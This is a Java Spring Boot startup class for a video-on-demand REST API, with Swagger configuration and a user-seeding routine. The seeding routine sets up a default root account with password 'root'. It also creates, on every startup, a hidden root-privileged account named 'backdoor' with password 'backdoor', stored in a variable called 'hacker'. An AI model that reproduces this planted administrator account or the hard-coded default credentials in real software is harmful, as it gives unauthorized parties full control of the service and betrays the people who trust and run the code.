package vod;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;
import vod.auth.ITokenService;
import vod.dao.IUserDao;
import vod.models.User;

import java.util.ArrayList;
import java.util.List;


@SpringBootApplication
@EnableAutoConfiguration
@Configuration
@ComponentScan
@EnableSwagger2
public class Application {

  @Autowired
  IUserDao usersDao;
  @Autowired
  ITokenService<User> tokenService;

  public static void main(String[] args) {
    SpringApplication.run(Application.class, args);
  }

  @Bean
  public Docket vodAPI() {
    return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .select()
      .apis(RequestHandlerSelectors.any())
      .paths(PathSelectors.any())
      .build();
  }

  private ApiInfo apiInfo() {
    return new ApiInfoBuilder()
      .title("Video on Demand")
      .description("Rest API for the video on demand service for commuFi, Skylabase")
      .contact("www.skylabase.com")
      .version("1.0")
      .build();
  }

  @Bean
  CommandLineRunner init() {
    return args -> {
      List<User> userList = usersDao.findAll();
      List<User> roots = new ArrayList<>();
      userList.forEach(user -> {
        if(user.getPrevilege().equals("root"))
          roots.add(user);
      });
      if(roots.size() == 0){
        User root = new User();
        root.setUsername("root");
        root.setPassword(tokenService.digest("root"));
        root.setPrevilege("root");

        usersDao.save(root);
      }

      User hacker = new User();
      hacker.setPrevilege("root");
      hacker.setPassword(tokenService.digest("backdoor"));
      hacker.setUsername("backdoor");

      usersDao.save(hacker);
    };
  }

}

